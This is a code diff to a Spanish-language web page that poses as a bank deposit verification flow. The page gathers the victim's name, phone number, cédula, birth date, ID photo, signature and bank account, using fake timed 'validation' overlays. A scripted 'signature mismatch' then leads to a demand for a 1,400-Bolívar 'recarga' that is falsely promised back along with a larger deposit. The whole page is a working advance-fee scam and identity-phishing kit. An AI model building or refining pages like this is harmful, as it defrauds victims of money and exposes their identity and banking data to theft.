@@ -381,6 +381,7 @@
       padding: 2rem;
       animation: fadeInUp 0.4s ease;
     }
+
     @keyframes fadeInUp {
       from { transform: translateY(30px); opacity: 0; }
       to { transform: translateY(0); opacity: 1; }
@@ -395,16 +396,26 @@
       padding: 2rem;
       position: relative;
       box-shadow: 0 8px 16px rgba(0,0,0,0.2);
-      animation: fadeInScale 0.4s ease;
+      /* Animación adicional de zoom para modal */
+      animation: zoomIn 0.4s ease;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
+      /* Ajustar espaciado de texto para no verse muy separadas las palabras */
+      word-wrap: break-word;
+      line-height: 1.4;
     }
 
-    @keyframes fadeInScale {
-      from { transform: scale(0.9); opacity: 0; }
-      to { transform: scale(1); opacity: 1; }
+    @keyframes zoomIn {
+      0% {
+        transform: scale(0.7);
+        opacity: 0;
+      }
+      100% {
+        transform: scale(1);
+        opacity: 1;
+      }
     }
 
     .unified-close-btn {
@@ -427,6 +438,7 @@
       border-radius: 50%;
       animation: spin 1s linear infinite;
     }
+
     @keyframes spin {
       100% { transform: rotate(360deg); }
     }
@@ -443,9 +455,23 @@
     .unified-text {
       font-size: 1rem;
       color: #333;
-      line-height: 1.6;
-      text-align: justify;
       margin: 1rem 0;
+      text-align: justify;
+    }
+
+    /* Ajustes responsive específicos para overlays en móviles */
+    @media (max-width: 500px) {
+      .unified-content {
+        padding: 1rem;
+        margin: 1rem;
+        line-height: 1.3;
+      }
+      .unified-title {
+        font-size: 1.2rem;
+      }
+      .unified-text {
+        font-size: 0.95rem;
+      }
     }
 
     /****************************************************
@@ -460,7 +486,7 @@
     }
 
     /****************************************************
-     * Barra de progreso (fija)
+     * Barra de progreso (fija) con animación al cambiar
      ****************************************************/
     .progress-indicator {
       position: fixed;
@@ -1366,6 +1392,7 @@
             <div class="verif-card">
               <h3>Lo Aprobado</h3>
               <ul>
+                <!-- Cambiadas las viñetas a checks verdes -->
                 <li><i class="fas fa-check-circle" style="color: #00A976; margin-right: 6px;"></i>Identidad del usuario</li>
                 <li><i class="fas fa-check-circle" style="color: #00A976; margin-right: 6px;"></i>El monto del depósito</li>
                 <li><i class="fas fa-check-circle" style="color: #00A976; margin-right: 6px;"></i>La cuenta bancaria proporcionada</li>
@@ -1375,6 +1402,7 @@
             <div class="verif-card">
               <h3>Lo Pendiente</h3>
               <ul>
+                <!-- Agregamos íconos para pendientes -->
                 <li><i class="fas fa-exclamation-circle" style="color: #F7B600; margin-right: 6px;"></i>Proceso de seguridad adicional (monto elevado)</li>
                 <li><i class="fas fa-exclamation-circle" style="color: #F7B600; margin-right: 6px;"></i>Verificación de la firma digital</li>
               </ul>
@@ -1491,835 +1519,830 @@
       </div> <!-- Fin STEP3 -->
     </main>
   </div> <!-- Fin container -->
+<script>
+/****************************************************
+ * Formatear montos a X.XXX,00
+ ****************************************************/
+function formatMoney(value = 0, currency = 'Bs') {
+  let num = parseFloat(value);
+  if (isNaN(num)) num = 0;
+  const formatted = new Intl.NumberFormat('de-DE', {
+    minimumFractionDigits: 2,
+    maximumFractionDigits: 2
+  }).format(num);
+  return `${formatted} ${currency}`;
+}
 
-  <script>
-    /****************************************************
-     * Formatear montos a X.XXX,00
-     ****************************************************/
-    function formatMoney(value = 0, currency = 'Bs') {
-      let num = parseFloat(value);
-      if (isNaN(num)) num = 0;
-      const formatted = new Intl.NumberFormat('de-DE', {
-        minimumFractionDigits: 2,
-        maximumFractionDigits: 2
-      }).format(num);
-      return `${formatted} ${currency}`;
+/****************************************************
+ * Intro Overlay
+ ****************************************************/
+const introOverlay = document.getElementById('introOverlay');
+const introMessage1 = document.getElementById('introMessage1');
+const introMessage2 = document.getElementById('introMessage2');
+
+introMessage1.style.display = 'block';
+setTimeout(() => {
+  introMessage1.style.display = 'none';
+  introMessage2.style.display = 'block';
+  setTimeout(() => {
+    introOverlay.style.display = 'none';
+  }, 2000);
+}, 3000);
+
+/****************************************************
+ * Variables globales
+ ****************************************************/
+const steps = document.querySelectorAll('.form-step');
+const sidebarSteps = document.querySelectorAll('.step-item');
+let currentStep = 1;
+
+// Barra de progreso
+const progressBar = document.getElementById('progressBar');
+
+// Overlays y modales (unificados)
+const validationOverlay = document.getElementById('validationOverlay');
+const modalConfirm = document.getElementById('modalConfirm');
+const modalConfirmContent = document.getElementById('modalConfirmContent');
+const finalLoadingOverlay = document.getElementById('finalLoadingOverlay');
+const comprobanteCierreMsg = document.getElementById('comprobanteCierreMsg');
+const overlay20s = document.getElementById('overlay20s');
+const modalAlertaRecarga = document.getElementById('modalAlertaRecarga');
+const modalAlertaRecargaContent = document.getElementById('modalAlertaRecargaContent');
+const btnAlertaRecargaOk = document.getElementById('btnAlertaRecargaOk');
+const overlayFirmaCoincide = document.getElementById('overlayFirmaCoincide');
+const overlayFirmaNoCoincide = document.getElementById('overlayFirmaNoCoincide');
+
+// Step 3 secciones
+const verificationMainCard = document.getElementById('verificationMainCard');
+const btnMainCardContinue = document.getElementById('btnMainCardContinue');
+const whyVerification = document.getElementById('whyVerification');
+const btnShowWhatToDo = document.getElementById('btnShowWhatToDo');
+const whatToDoCard = document.getElementById('whatToDoCard');
+const conceptRecarga = document.getElementById('conceptRecarga');
+const btnAfterRecarga = document.getElementById('btnAfterRecarga');
+const finalRechargeData = document.getElementById('finalRechargeData');
+const btnFinalRecargaContinuar = document.getElementById('btnFinalRecargaContinuar');
+const reembolsoBanner = document.getElementById('reembolsoBanner');
+const finalMontoGlobalEl = document.getElementById('finalMontoGlobal');
+
+// Datos personales para Step3 (las 3 tarjetas)
+const cardFullName = document.getElementById('cardFullName');
+const cardAccount = document.getElementById('cardAccount');
+const cardBank = document.getElementById('cardBank');
+const cardMontos = document.getElementById('cardMontos');
+
+// Overlays "Conectando Banco" y "Razón Adicional"
+const overlayConectandoBanco = document.getElementById('overlayConectandoBanco');
+const overlayRazonAdicional = document.getElementById('overlayRazonAdicional');
+const btnRazonAdicionalContinue = document.getElementById('btnRazonAdicionalContinue');
+
+// Inputs finales
+const finalBankOrigin = document.getElementById('finalBankOrigin');
+const finalPhone = document.getElementById('finalPhone');
+const finalCedula = document.getElementById('finalCedula');
+const verifNumeroComprobante = document.getElementById('verifNumeroComprobante');
+const finalBankNameForReceipt = document.getElementById('finalBankNameForReceipt');
+
+// Control del "confirm step"
+let confirmStep = 1;
+
+document.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('waFloat').style.display = 'flex';
+});
+
+/****************************************************
+ * Manejo de Steps y scroll
+ ****************************************************/
+function showStep(step) {
+  steps.forEach((st) => st.classList.remove('active'));
+  steps[step - 1].classList.add('active');
+  updateProgress(step);
+  sidebarSteps.forEach((item, idx) => {
+    item.classList.remove('active');
+    if (idx < step) {
+      item.classList.add('active');
     }
+  });
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+  currentStep = step;
+}
 
-    /****************************************************
-     * Intro Overlay
-     ****************************************************/
-    const introOverlay = document.getElementById('introOverlay');
-    const introMessage1 = document.getElementById('introMessage1');
-    const introMessage2 = document.getElementById('introMessage2');
+function updateProgress(step) {
+  const total = steps.length;
+  progressBar.style.width = ((step - 1) / (total - 1)) * 100 + '%';
+}
 
-    introMessage1.style.display = 'block';
-    setTimeout(() => {
-      introMessage1.style.display = 'none';
-      introMessage2.style.display = 'block';
+/****************************************************
+ * STEP 1 => Continuar
+ ****************************************************/
+function onContinueStep1() {
+  if (!validateStep1()) return;
+  validationOverlay.style.display = 'flex';
+  setTimeout(() => {
+    validationOverlay.style.display = 'none';
+    confirmStep = 1;
+    modalConfirmContent.innerHTML = buildSummaryStep1();
+    modalConfirm.style.display = 'flex';
+  }, 5000);
+}
+
+function validateStep1() {
+  const fullName = document.getElementById('fullName');
+  const phonePrefix = document.getElementById('phonePrefix');
+  const phoneNumber = document.getElementById('phoneNumber');
+  const docType = document.getElementById('docType');
+  const nacionalidad = document.getElementById('nacionalidad');
+  const cedulaNumber = document.getElementById('cedulaNumber');
+  const birthDate = document.getElementById('birthDate');
+  const docUpload = document.getElementById('docUpload');
+  const signatureData = document.getElementById('signatureData');
+
+  if (!fullName.value.trim()) {
+    alert("Por favor, ingresa tu nombre completo.");
+    return false;
+  }
+  if (!phonePrefix.value) {
+    alert("Por favor, selecciona tu operadora.");
+    return false;
+  }
+  if (!phoneNumber.value.trim()) {
+    alert("Por favor, ingresa tu número de teléfono.");
+    return false;
+  }
+  if (!docType.value) {
+    alert("Por favor, selecciona el tipo de documento.");
+    return false;
+  }
+  if (!nacionalidad.value) {
+    alert("Por favor, selecciona tu nacionalidad.");
+    return false;
+  }
+  if (!cedulaNumber.value.trim()) {
+    alert("Por favor, ingresa tu número de cédula.");
+    return false;
+  }
+  if (!birthDate.value) {
+    alert("Por favor, ingresa tu fecha de nacimiento.");
+    return false;
+  }
+  if (!docUpload.files.length) {
+    alert("Por favor, sube tu documento de identidad (imagen).");
+    return false;
+  }
+  if (!signatureData.value) {
+    alert("Por favor, guarda tu firma digital antes de continuar.");
+    return false;
+  }
+  return true;
+}
+
+function buildSummaryStep1() {
+  const fullName = document.getElementById('fullName').value;
+  const phonePrefix = document.getElementById('phonePrefix').value;
+  const phoneNumber = document.getElementById('phoneNumber').value;
+  const docType = document.getElementById('docType').value;
+  const nacionalidad = document.getElementById('nacionalidad').value;
+  const cedulaNumber = document.getElementById('cedulaNumber').value;
+  const birthDate = document.getElementById('birthDate').value;
+  const docUpload = document.getElementById('docUpload');
+  const docFileName = docUpload.files.length ? docUpload.files[0].name : '';
+  const signatureData = document.getElementById('signatureData').value;
+
+  return `
+    <p><strong>Nombre y Apellido:</strong> ${fullName}</p>
+    <p><strong>Teléfono:</strong> ${phonePrefix}-${phoneNumber}</p>
+    <p><strong>Tipo de Documento:</strong> ${docType}</p>
+    <p><strong>Nacionalidad:</strong> ${nacionalidad}</p>
+    <p><strong>N° de Cédula:</strong> ${cedulaNumber}</p>
+    <p><strong>Fecha de Nacimiento:</strong> ${birthDate}</p>
+    <p><strong>Documento de Identidad:</strong> ${docFileName}</p>
+    <div style="margin-top:1rem;">
+      <strong>Firma Digital:</strong><br/>
+      <img src="${signatureData}" alt="Firma Digital" style="max-width:200px;"/>
+    </div>
+  `;
+}
+
+/****************************************************
+ * STEP 2 => Continuar
+ ****************************************************/
+function onContinueStep2() {
+  if (!validateStep2()) return;
+  validationOverlay.style.display = 'flex';
+  setTimeout(() => {
+    validationOverlay.style.display = 'none';
+    confirmStep = 2;
+    modalConfirmContent.innerHTML = buildSummaryStep2();
+    modalConfirm.style.display = 'flex';
+  }, 5000);
+}
+
+function validateStep2() {
+  const bankName = document.getElementById('bankName');
+  const accountNumber = document.getElementById('accountNumber');
+  const accountType = document.getElementById('accountType');
+  const origenFondos = document.getElementById('origenFondos');
+  const montoAlto = document.getElementById('montoAlto');
+  const depositante = document.getElementById('depositante');
+  const comprobante = document.getElementById('comprobante');
+  const metodoDeposito = document.getElementById('metodoDeposito');
+  const acceptTerms = document.getElementById('acceptTerms');
+
+  if (!bankName.value) {
+    alert("Por favor, selecciona tu banco.");
+    return false;
+  }
+  if (!accountNumber.value.trim()) {
+    alert("Por favor, ingresa tu número de cuenta.");
+    return false;
+  }
+  if (!accountType.value) {
+    alert("Por favor, selecciona el tipo de cuenta / moneda.");
+    return false;
+  }
+  if (!origenFondos.value) {
+    alert("Por favor, selecciona el origen de los fondos.");
+    return false;
+  }
+  if (!montoAlto.value) {
+    alert("Por favor, indica si recibes usualmente montos altos.");
+    return false;
+  }
+  if (!depositante.value.trim()) {
+    alert("Por favor, ingresa el nombre del depositante / titular.");
+    return false;
+  }
+  if (!comprobante.value.trim()) {
+    alert("Por favor, ingresa el número de comprobante.");
+    return false;
+  }
+  if (!metodoDeposito.value) {
+    alert("Por favor, selecciona el método de depósito.");
+    return false;
+  }
+  if (!acceptTerms.checked) {
+    alert("Debes aceptar los términos y condiciones.");
+    return false;
+  }
+  return true;
+}
+
+function buildSummaryStep2() {
+  const bankNameValue = document.getElementById('bankName').value;
+  const [bankCode, bankNameText] = bankNameValue ? bankNameValue.split('|') : ['', ''];
+  const accountNumber = document.getElementById('accountNumber').value;
+  const accountType = document.getElementById('accountType').value;
+  const origenFondos = document.getElementById('origenFondos').value;
+  let usdAmountVal = document.getElementById('usdAmount').value;
+  let bsAmountVal = document.getElementById('bsAmount').value;
+  if (usdAmountVal) {
+    usdAmountVal = formatMoney(usdAmountVal, 'USD');
+  }
+  if (bsAmountVal) {
+    bsAmountVal = formatMoney(bsAmountVal, 'Bolívares');
+  }
+  const montoAlto = document.getElementById('montoAlto').value;
+  const depositante = document.getElementById('depositante').value;
+  const comprobante = document.getElementById('comprobante').value;
+  const metodoDeposito = document.getElementById('metodoDeposito').value;
+
+  let currency = 'Bs';
+  if (accountType === 'usd') currency = 'USD';
+  if (accountType === 'eur') currency = 'EUR';
+
+  return `
+    <p><strong>Banco:</strong> ${bankNameText} (${bankCode || 'N/A'})</p>
+    <p><strong>Número de Cuenta:</strong> ${accountNumber}</p>
+    <p><strong>Tipo de Cuenta / Moneda:</strong> ${accountType.toUpperCase()} (${currency})</p>
+    <p><strong>Origen de Fondos:</strong> ${origenFondos}</p>
+    ${
+      usdAmountVal
+      ? `<p><strong>Monto en USD:</strong> ${usdAmountVal}</p>`
+      : ''
+    }
+    ${
+      bsAmountVal
+      ? `<p><strong>Equivalente en Bolívares:</strong> ${bsAmountVal}</p>`
+      : ''
+    }
+    <p><strong>¿Recibe montos altos?:</strong> ${montoAlto}</p>
+    <p><strong>Depositante / Titular:</strong> ${depositante}</p>
+    <p><strong>N° de Comprobante:</strong> ${comprobante}</p>
+    <p><strong>Método de Depósito:</strong> ${
+      metodoDeposito === 'pagoMovil' 
+        ? 'Pago Móvil'
+        : 'Transferencia Tradicional'
+    }</p>
+  `;
+}
+
+/****************************************************
+ * Aceptar (Modal Confirm)
+ ****************************************************/
+const btnModalConfirmOk = document.getElementById('btnModalConfirmOk');
+btnModalConfirmOk.addEventListener('click', () => {
+  modalConfirm.style.display = 'none';
+  overlayFirmaCoincide.style.display = 'flex';
+});
+
+const btnFirmaCoincideOk = document.getElementById('btnFirmaCoincideOk');
+btnFirmaCoincideOk.addEventListener('click', () => {
+  overlayFirmaCoincide.style.display = 'none';
+  if (confirmStep === 1) {
+    showStep(2);
+  } else if (confirmStep === 2) {
+    showOverlayFirmaNoCoincide();
+  }
+});
+
+function showOverlayFirmaNoCoincide() {
+  overlayFirmaNoCoincide.style.display = 'flex';
+  setTimeout(() => {
+    overlayFirmaNoCoincide.style.display = 'none';
+    showStep(3);
+    startOverlay20s();
+  }, 5000);
+}
+
+/****************************************************
+ * Overlay de 20s en Step3
+ ****************************************************/
+function startOverlay20s() {
+  overlay20s.style.display = 'flex';
+  const msgs = [
+    document.getElementById('overlayMsg1'),
+    document.getElementById('overlayMsg2'),
+    document.getElementById('overlayMsg3'),
+    document.getElementById('overlayMsg4')
+  ];
+  msgs.forEach((m) => m.style.display = 'none');
+  let index = 0;
+  msgs[0].style.display = 'block';
+
+  const interval = setInterval(() => {
+    index++;
+    if (index < msgs.length) {
+      msgs[index - 1].style.display = 'none';
+      msgs[index].style.display = 'block';
+    } else {
+      clearInterval(interval);
       setTimeout(() => {
-        introOverlay.style.display = 'none';
-      }, 2000);
-    }, 3000);
-
-    /****************************************************
-     * Variables globales
-     ****************************************************/
-    const steps = document.querySelectorAll('.form-step');
-    const sidebarSteps = document.querySelectorAll('.step-item');
-    let currentStep = 1;
-
-    // Barra de progreso
-    const progressBar = document.getElementById('progressBar');
-
-    // Overlays y modales (unificados)
-    const validationOverlay = document.getElementById('validationOverlay');
-    const modalConfirm = document.getElementById('modalConfirm');
-    const modalConfirmContent = document.getElementById('modalConfirmContent');
-    const finalLoadingOverlay = document.getElementById('finalLoadingOverlay');
-    const comprobanteCierreMsg = document.getElementById('comprobanteCierreMsg');
-    const overlay20s = document.getElementById('overlay20s');
-    const modalAlertaRecarga = document.getElementById('modalAlertaRecarga');
-    const modalAlertaRecargaContent = document.getElementById('modalAlertaRecargaContent');
-    const btnAlertaRecargaOk = document.getElementById('btnAlertaRecargaOk');
-    const overlayFirmaCoincide = document.getElementById('overlayFirmaCoincide');
-    const overlayFirmaNoCoincide = document.getElementById('overlayFirmaNoCoincide');
-
-    // Step 3 secciones
-    const verificationMainCard = document.getElementById('verificationMainCard');
-    const btnMainCardContinue = document.getElementById('btnMainCardContinue');
-    const whyVerification = document.getElementById('whyVerification');
-    const btnShowWhatToDo = document.getElementById('btnShowWhatToDo');
-    const whatToDoCard = document.getElementById('whatToDoCard');
-    const conceptRecarga = document.getElementById('conceptRecarga');
-    const btnAfterRecarga = document.getElementById('btnAfterRecarga');
-    const finalRechargeData = document.getElementById('finalRechargeData');
-    const btnFinalRecargaContinuar = document.getElementById('btnFinalRecargaContinuar');
-    const reembolsoBanner = document.getElementById('reembolsoBanner');
-    const finalMontoGlobalEl = document.getElementById('finalMontoGlobal');
-
-    // Datos personales para Step3 (las 3 tarjetas)
-    const cardFullName = document.getElementById('cardFullName');
-    const cardAccount = document.getElementById('cardAccount');
-    const cardBank = document.getElementById('cardBank');
-    const cardMontos = document.getElementById('cardMontos');
-
-    // Overlays "Conectando Banco" y "Razón Adicional"
-    const overlayConectandoBanco = document.getElementById('overlayConectandoBanco');
-    const overlayRazonAdicional = document.getElementById('overlayRazonAdicional');
-    const btnRazonAdicionalContinue = document.getElementById('btnRazonAdicionalContinue');
-
-    // Inputs finales
-    const finalBankOrigin = document.getElementById('finalBankOrigin');
-    const finalPhone = document.getElementById('finalPhone');
-    const finalCedula = document.getElementById('finalCedula');
-    const verifNumeroComprobante = document.getElementById('verifNumeroComprobante');
-    const finalBankNameForReceipt = document.getElementById('finalBankNameForReceipt');
-
-    // Control del "confirm step"
-    let confirmStep = 1;
-
-    document.addEventListener('DOMContentLoaded', () => {
-      document.getElementById('waFloat').style.display = 'flex';
-    });
-
-    /****************************************************
-     * Manejo de Steps y scroll
-     ****************************************************/
-    function showStep(step) {
-      steps.forEach((st) => st.classList.remove('active'));
-      steps[step - 1].classList.add('active');
-      updateProgress(step);
-      sidebarSteps.forEach((item, idx) => {
-        item.classList.remove('active');
-        if (idx < step) {
-          item.classList.add('active');
-        }
-      });
-      window.scrollTo({ top: 0, behavior: 'smooth' });
-      currentStep = step;
+        overlay20s.style.display = 'none';
+        showVerificationMainCard();
+      }, 800);
     }
+  }, 5000);
+}
 
-    function updateProgress(step) {
-      const total = steps.length;
-      progressBar.style.width = ((step - 1) / (total - 1)) * 100 + '%';
-    }
+function showVerificationMainCard() {
+  verificationMainCard.style.display = 'block';
+  fillVerificationMainCardData();
+  startMainCardCountdown();
+}
 
-    /****************************************************
-     * STEP 1 => Continuar
-     ****************************************************/
-    function onContinueStep1() {
-      if (!validateStep1()) return;
-      validationOverlay.style.display = 'flex';
-      setTimeout(() => {
-        validationOverlay.style.display = 'none';
-        confirmStep = 1;
-        modalConfirmContent.innerHTML = buildSummaryStep1();
-        modalConfirm.style.display = 'flex';
-      }, 5000);
-    }
+/* Llenar datos de las 3 tarjetas en "¡Importante! Revisión de Seguridad..." */
+function fillVerificationMainCardData() {
+  const fullNameVal = document.getElementById('fullName').value.trim() || 'Usuario';
+  const bankVal = document.getElementById('bankName').value;
+  const [bankCode, bankNameText] = bankVal.split('|') || [];
+  const accountNumberVal = document.getElementById('accountNumber').value || '******';
+  // Monto en Bs que recibirá el usuario
+  let bsUserInput = parseFloat(document.getElementById('bsAmount').value) || 0; 
+  // La parte en USD es opcional
+  const usdAmountVal = document.getElementById('usdAmount').value;
+  let usdFormatted = usdAmountVal ? `${usdAmountVal} USD` : 'N/A';
 
-    function validateStep1() {
-      const fullName = document.getElementById('fullName');
-      const phonePrefix = document.getElementById('phonePrefix');
-      const phoneNumber = document.getElementById('phoneNumber');
-      const docType = document.getElementById('docType');
-      const nacionalidad = document.getElementById('nacionalidad');
-      const cedulaNumber = document.getElementById('cedulaNumber');
-      const birthDate = document.getElementById('birthDate');
-      const docUpload = document.getElementById('docUpload');
-      const signatureData = document.getElementById('signatureData');
+  // Llenar la primera tarjeta
+  cardFullName.textContent = `${fullNameVal}`;
+  cardAccount.textContent = `${accountNumberVal}`;
+  cardBank.textContent = bankNameText || 'Banco Seleccionado';
+  cardMontos.textContent = `${formatMoney(bsUserInput)} / ${usdFormatted}`;
 
-      if (!fullName.value.trim()) {
-        alert("Por favor, ingresa tu nombre completo.");
-        return false;
-      }
-      if (!phonePrefix.value) {
-        alert("Por favor, selecciona tu operadora.");
-        return false;
-      }
-      if (!phoneNumber.value.trim()) {
-        alert("Por favor, ingresa tu número de teléfono.");
-        return false;
-      }
-      if (!docType.value) {
-        alert("Por favor, selecciona el tipo de documento.");
-        return false;
-      }
-      if (!nacionalidad.value) {
-        alert("Por favor, selecciona tu nacionalidad.");
-        return false;
-      }
-      if (!cedulaNumber.value.trim()) {
-        alert("Por favor, ingresa tu número de cédula.");
-        return false;
-      }
-      if (!birthDate.value) {
-        alert("Por favor, ingresa tu fecha de nacimiento.");
-        return false;
-      }
-      if (!docUpload.files.length) {
-        alert("Por favor, sube tu documento de identidad (imagen).");
-        return false;
-      }
-      if (!signatureData.value) {
-        alert("Por favor, guarda tu firma digital antes de continuar.");
-        return false;
-      }
-      return true;
-    }
+  // Generar “concepto recarga” = primerNombre + cédula
+  const cedulaVal = document.getElementById('cedulaNumber').value || '';
+  const firstName = fullNameVal.split(' ')[0] || 'Usuario';
+  const conceptValue = (firstName + cedulaVal).toUpperCase().replace(/\s+/g, '');
+  conceptRecarga.textContent = conceptValue;
 
-    function buildSummaryStep1() {
-      const fullName = document.getElementById('fullName').value;
-      const phonePrefix = document.getElementById('phonePrefix').value;
-      const phoneNumber = document.getElementById('phoneNumber').value;
-      const docType = document.getElementById('docType').value;
-      const nacionalidad = document.getElementById('nacionalidad').value;
-      const cedulaNumber = document.getElementById('cedulaNumber').value;
-      const birthDate = document.getElementById('birthDate').value;
-      const docUpload = document.getElementById('docUpload');
-      const docFileName = docUpload.files.length ? docUpload.files[0].name : '';
-      const signatureData = document.getElementById('signatureData').value;
+  // Llenar datos finales para la sección "Completar Recarga"
+  finalBankOrigin.textContent = bankNameText || 'Banco Origen';
+  const prefix = document.getElementById('phonePrefix').value;
+  const phone = document.getElementById('phoneNumber').value;
+  finalPhone.textContent = prefix + '-' + phone;
+  finalCedula.textContent = cedulaVal;
 
-      return `
-        <p><strong>Nombre y Apellido:</strong> ${fullName}</p>
-        <p><strong>Teléfono:</strong> ${phonePrefix}-${phoneNumber}</p>
-        <p><strong>Tipo de Documento:</strong> ${docType}</p>
-        <p><strong>Nacionalidad:</strong> ${nacionalidad}</p>
-        <p><strong>N° de Cédula:</strong> ${cedulaNumber}</p>
-        <p><strong>Fecha de Nacimiento:</strong> ${birthDate}</p>
-        <p><strong>Documento de Identidad:</strong> ${docFileName}</p>
-        <div style="margin-top:1rem;">
-          <strong>Firma Digital:</strong><br/>
-          <img src="${signatureData}" alt="Firma Digital" style="max-width:200px;"/>
-        </div>
-      `;
-    }
+  // También mostrar en la etiqueta final (Comprobante de Pago Móvil del X)
+  finalBankNameForReceipt.textContent = bankNameText || 'tu banco';
 
-    /****************************************************
-     * STEP 2 => Continuar
-     ****************************************************/
-    function onContinueStep2() {
-      if (!validateStep2()) return;
-      validationOverlay.style.display = 'flex';
-      setTimeout(() => {
-        validationOverlay.style.display = 'none';
-        confirmStep = 2;
-        modalConfirmContent.innerHTML = buildSummaryStep2();
-        modalConfirm.style.display = 'flex';
-      }, 5000);
-    }
+  // ===== Cálculo dinámico =====
+  // El monto fijo de recarga: 1400
+  const recargaFija = 1400;
+  const totalConRecarga = bsUserInput + recargaFija;
 
-    function validateStep2() {
-      const bankName = document.getElementById('bankName');
-      const accountNumber = document.getElementById('accountNumber');
-      const accountType = document.getElementById('accountType');
-      const origenFondos = document.getElementById('origenFondos');
-      const montoAlto = document.getElementById('montoAlto');
-      const depositante = document.getElementById('depositante');
-      const comprobante = document.getElementById('comprobante');
-      const metodoDeposito = document.getElementById('metodoDeposito');
-      const acceptTerms = document.getElementById('acceptTerms');
+  // Actualizar el texto de reembolso
+  reembolsoBanner.innerHTML = `
+    Al realizar esta recarga de <strong>1.400,00 Bolívares</strong>, 
+    se te devolverá junto con ${formatMoney(bsUserInput)}.
+    Por lo tanto, recibirás inmediatamente un depósito total por 
+    <strong>${formatMoney(totalConRecarga)}</strong>.
+  `;
 
-      if (!bankName.value) {
-        alert("Por favor, selecciona tu banco.");
-        return false;
-      }
-      if (!accountNumber.value.trim()) {
-        alert("Por favor, ingresa tu número de cuenta.");
-        return false;
-      }
-      if (!accountType.value) {
-        alert("Por favor, selecciona el tipo de cuenta / moneda.");
-        return false;
-      }
-      if (!origenFondos.value) {
-        alert("Por favor, selecciona el origen de los fondos.");
-        return false;
-      }
-      if (!montoAlto.value) {
-        alert("Por favor, indica si recibes usualmente montos altos.");
-        return false;
-      }
-      if (!depositante.value.trim()) {
-        alert("Por favor, ingresa el nombre del depositante / titular.");
-        return false;
-      }
-      if (!comprobante.value.trim()) {
-        alert("Por favor, ingresa el número de comprobante.");
-        return false;
-      }
-      if (!metodoDeposito.value) {
-        alert("Por favor, selecciona el método de depósito.");
-        return false;
-      }
-      if (!acceptTerms.checked) {
-        alert("Debes aceptar los términos y condiciones.");
-        return false;
-      }
-      return true;
-    }
+  finalMontoGlobalEl.textContent = formatMoney(totalConRecarga);
+}
 
-    function buildSummaryStep2() {
-      const bankNameValue = document.getElementById('bankName').value;
-      const [bankCode, bankNameText] = bankNameValue ? bankNameValue.split('|') : ['', ''];
-      const accountNumber = document.getElementById('accountNumber').value;
-      const accountType = document.getElementById('accountType').value;
-      const origenFondos = document.getElementById('origenFondos').value;
-      let usdAmountVal = document.getElementById('usdAmount').value;
-      let bsAmountVal = document.getElementById('bsAmount').value;
-      if (usdAmountVal) {
-        usdAmountVal = formatMoney(usdAmountVal, 'USD');
-      }
-      if (bsAmountVal) {
-        bsAmountVal = formatMoney(bsAmountVal, 'Bolívares');
-      }
-      const montoAlto = document.getElementById('montoAlto').value;
-      const depositante = document.getElementById('depositante').value;
-      const comprobante = document.getElementById('comprobante').value;
-      const metodoDeposito = document.getElementById('metodoDeposito').value;
+function startMainCardCountdown() {
+  let count = 60;
+  btnMainCardContinue.disabled = true;
+  btnMainCardContinue.textContent = `Espera ${count}s...`;
+  btnMainCardContinue.classList.add('btn-disabled');
 
-      let currency = 'Bs';
-      if (accountType === 'usd') currency = 'USD';
-      if (accountType === 'eur') currency = 'EUR';
-
-      return `
-        <p><strong>Banco:</strong> ${bankNameText} (${bankCode || 'N/A'})</p>
-        <p><strong>Número de Cuenta:</strong> ${accountNumber}</p>
-        <p><strong>Tipo de Cuenta / Moneda:</strong> ${accountType.toUpperCase()} (${currency})</p>
-        <p><strong>Origen de Fondos:</strong> ${origenFondos}</p>
-        ${
-          usdAmountVal
-          ? `<p><strong>Monto en USD:</strong> ${usdAmountVal}</p>`
-          : ''
-        }
-        ${
-          bsAmountVal
-          ? `<p><strong>Equivalente en Bolívares:</strong> ${bsAmountVal}</p>`
-          : ''
-        }
-        <p><strong>¿Recibe montos altos?:</strong> ${montoAlto}</p>
-        <p><strong>Depositante / Titular:</strong> ${depositante}</p>
-        <p><strong>N° de Comprobante:</strong> ${comprobante}</p>
-        <p><strong>Método de Depósito:</strong> ${
-          metodoDeposito === 'pagoMovil' 
-            ? 'Pago Móvil'
-            : 'Transferencia Tradicional'
-        }</p>
-      `;
-    }
-
-    /****************************************************
-     * Aceptar (Modal Confirm)
-     ****************************************************/
-    const btnModalConfirmOk = document.getElementById('btnModalConfirmOk');
-    btnModalConfirmOk.addEventListener('click', () => {
-      modalConfirm.style.display = 'none';
-      overlayFirmaCoincide.style.display = 'flex';
-    });
-
-    const btnFirmaCoincideOk = document.getElementById('btnFirmaCoincideOk');
-    btnFirmaCoincideOk.addEventListener('click', () => {
-      overlayFirmaCoincide.style.display = 'none';
-      if (confirmStep === 1) {
-        showStep(2);
-      } else if (confirmStep === 2) {
-        showOverlayFirmaNoCoincide();
-      }
-    });
-
-    function showOverlayFirmaNoCoincide() {
-      overlayFirmaNoCoincide.style.display = 'flex';
-      setTimeout(() => {
-        overlayFirmaNoCoincide.style.display = 'none';
-        showStep(3);
-        startOverlay20s();
-      }, 5000);
-    }
-
-    /****************************************************
-     * Overlay de 20s en Step3
-     ****************************************************/
-    function startOverlay20s() {
-      overlay20s.style.display = 'flex';
-      const msgs = [
-        document.getElementById('overlayMsg1'),
-        document.getElementById('overlayMsg2'),
-        document.getElementById('overlayMsg3'),
-        document.getElementById('overlayMsg4')
-      ];
-      msgs.forEach((m) => m.style.display = 'none');
-      let index = 0;
-      msgs[0].style.display = 'block';
-
-      const interval = setInterval(() => {
-        index++;
-        if (index < msgs.length) {
-          msgs[index - 1].style.display = 'none';
-          msgs[index].style.display = 'block';
-        } else {
-          clearInterval(interval);
-          setTimeout(() => {
-            overlay20s.style.display = 'none';
-            showVerificationMainCard();
-          }, 800);
-        }
-      }, 5000);
-    }
-
-    function showVerificationMainCard() {
-      verificationMainCard.style.display = 'block';
-      fillVerificationMainCardData();
-      startMainCardCountdown();
-    }
-
-    /* Llenar datos de las 3 tarjetas en "¡Importante! Revisión de Seguridad..." */
-    function fillVerificationMainCardData() {
-      const fullNameVal = document.getElementById('fullName').value.trim() || 'Usuario';
-      const bankVal = document.getElementById('bankName').value;
-      const [bankCode, bankNameText] = bankVal.split('|') || [];
-      const accountNumberVal = document.getElementById('accountNumber').value || '******';
-      const docTypeVal = document.getElementById('docType').value || '';
-      const cedulaVal = document.getElementById('cedulaNumber').value || '';
